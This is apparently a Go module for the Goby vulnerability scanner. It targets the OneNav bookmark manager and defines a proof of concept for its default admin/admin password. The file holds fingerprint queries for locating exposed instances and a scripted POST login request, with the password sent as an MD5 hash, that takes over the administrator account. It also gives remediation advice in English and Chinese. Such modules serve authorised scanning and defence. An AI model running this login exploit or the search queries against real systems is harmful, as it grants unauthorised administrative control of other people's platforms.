package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "OneNav index.php Default Password Vulnerability",
    "Description": "<p>OneNav is a bookmark management application. </p><p>There is a default password for this application. An attacker can control the entire platform through the default password (admin/admin) and operate the core functions with administrator privileges.</p>",
    "Product": "onenav",
    "Homepage": "https://www.onenav.top/",
    "DisclosureDate": "2022-03-31",
    "Author": "13eczou",
    "FofaQuery": "body=\"https://github.com/helloxz/onenav\" || body=\"href=\\\"/index.php?c=login\\\" title = \\\"登录OneNav\" || title=\"OneNav - 开源书签管理程序\" || body=\"<meta name=\\\"description\\\" content=\\\"OneNav\"",
    "GobyQuery": "body=\"https://github.com/helloxz/onenav\" || body=\"href=\\\"/index.php?c=login\\\" title = \\\"登录OneNav\" || title=\"OneNav - 开源书签管理程序\" || body=\"<meta name=\\\"description\\\" content=\\\"OneNav\"",
    "Level": "1",
    "Impact": "<p>Attackers can control the entire platform through the default password(admin/admin) vulnerability, and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php?c=login&u=admin",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "user=admin&pass=21232f297a57a5a743894a0e4a801fc3"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "successful",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "admin_key",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php?c=login&u=admin",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "user=admin&pass=21232f297a57a5a743894a0e4a801fc3"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "successful",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "admin_key",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|text|账号：admin 密码：admin"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "OneNav 书签管理应用 index.php 默认口令漏洞",
            "Product": "OneNav-书签管理",
            "Description": "<p>OneNav 是一款书签管理应用。</p><p>该应用存在默认口令，攻击者可通过默认口令（admin/admin）控制整个平台，使用管理员权限操作核心功能。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令（admin/admin）漏洞控制整个平台，使用管理员权限操作核心的功能。<br><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "OneNav index.php Default Password Vulnerability",
            "Product": "onenav",
            "Description": "<p>OneNav is a bookmark management application.&nbsp;</p><p>There is a default password for this application. An attacker can control the entire platform through the default password (admin/admin) and operate the core functions with administrator privileges.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can control the entire platform through the default password(admin/admin) vulnerability, and use administrator privileges to operate core functions.</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10818"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}